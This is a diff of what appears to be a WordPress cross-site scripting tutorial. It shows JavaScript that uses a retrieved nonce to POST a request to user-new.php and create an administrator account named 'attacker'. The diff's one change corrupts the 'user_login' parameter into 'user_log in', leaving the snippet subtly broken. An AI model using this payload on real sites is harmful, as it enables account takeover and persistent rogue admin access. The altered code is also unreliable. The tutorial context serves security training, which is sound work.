@@ -268,7 +268,7 @@ This function performs a new HTTP request towards the /wp-admin/user-new.php URL
 
 Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.
 ```bash
-var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_log in=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
 ajaxRequest = new XMLHttpRequest();
 ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
